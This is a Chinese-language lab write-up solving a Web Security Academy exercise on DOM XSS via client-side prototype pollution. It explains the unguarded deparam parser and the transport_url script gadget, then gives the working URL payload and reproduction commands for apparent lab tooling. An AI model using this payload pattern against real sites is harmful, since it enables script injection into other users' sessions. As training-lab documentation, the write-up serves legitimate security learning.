---
title: "lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution"
links:
  - target: prototype-pollution-family
    relation: evidences
---

# lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution

> evidences: [[prototype-pollution-family]]

- 题面:DOM XSS via client-side prototype pollution(/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)
- 实例:https://0a6e008904f6852781230c2300380068.web-security-academy.net
- 判定目标:原型链污染 + gadget 触发 `alert(1)`;状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 面

- source:首页引 `/resources/js/deparam.js`;`searchLogger.js` 在 `load` 调
  `deparam(new URL(location).searchParams.toString())`。
- deparam 用 `keys = key.split('][')` + `cur = cur[key] = ...` 无 proto 守卫;
  `__proto__[x]` 时 `cur` 落到 `Object.prototype` 并写入 `x`。
- gadget:`searchLogger.js`
  ```js
  let config = {params: deparam(...)};
  if(config.transport_url){ let s=document.createElement('script'); s.src=config.transport_url; document.body.appendChild(s); }
  ```
  `config.transport_url` 从被污染的 `Object.prototype` 继承 → `script.src` 可控。

## 载荷与证据

```
https://<inst>/?__proto__[transport_url]=data:,alert(1)//
lab_alert <payload> --settle-ms 2500 -> {"fired":true,"alerts":["alert:1"]}
solved_check <inst> -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch 779D6590142EC062340C7103FC3F043C4A7FCF81748EF0740FC02B5DEC467114 \
  --widget-source /web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution \
  --jar /tmp/b21-campaign-jar.json
lab_alert "https://<inst>/?__proto__[transport_url]=data:,alert(1)//" --settle-ms 2500
solved_check "https://<inst>/" --jar /tmp/b21-jar1.json
```

## 备注

- `data:,alert(1)//` 用 `//` 吞掉尾部;`data:` URL 作为 script.src 即在文档上下文求值。
- `lab_alert` fired=true 是本地证据;实例横幅 is-solved 是终态证据。
